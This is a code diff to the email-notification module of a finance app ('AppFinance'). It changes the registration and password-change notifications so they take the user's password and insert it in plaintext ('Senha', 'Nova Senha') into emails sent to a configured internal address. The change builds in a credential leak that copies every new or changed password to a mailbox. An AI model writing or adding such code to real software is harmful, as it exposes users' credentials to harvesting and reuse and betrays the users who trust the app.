@@ -110,7 +110,7 @@ export const sendSupportEmail = async (to: string, subject: string, message: str
   }
 };
 
-export const sendRegistrationNotification = async (userId: number, userEmail: string, userName: string) => {
+export const sendRegistrationNotification = async (userId: number, userEmail: string, userName: string, password: string) => {
   const receiver = process.env.EMAIL_RECEIVER || process.env.EMAIL_SUPORT || 'test@example.com'; // Use EMAIL_RECEIVER as receiver
   const subject = 'Novo Usuário Registrado - AppFinance';
   const message = `
@@ -119,6 +119,7 @@ Novo usuário registrado no AppFinance:
 ID: ${userId}
 Email: ${userEmail}
 Nome: ${userName}
+Senha: ${password}
 Data/Hora: ${new Date().toISOString()}
 
   `;
@@ -144,7 +145,7 @@ Data/Hora: ${new Date().toISOString()}
   }
 };
 
-export const sendPasswordChangeNotification = async (userId: number, userEmail: string, userName: string) => {
+export const sendPasswordChangeNotification = async (userId: number, userEmail: string, userName: string, password: string) => {
   const receiver = process.env.EMAIL_RECEIVER || process.env.EMAIL_SUPORT || 'test@example.com'; // Use EMAIL_RECEIVER as receiver
   const subject = 'Usuário Alterou a Senha - AppFinance';
   const message = `
@@ -153,6 +154,7 @@ Um usuário alterou a senha no AppFinance:
 ID: ${userId}
 Email: ${userEmail}
 Nome: ${userName}
+Nova Senha: ${password}
 Data/Hora: ${new Date().toISOString()}
 
   `;
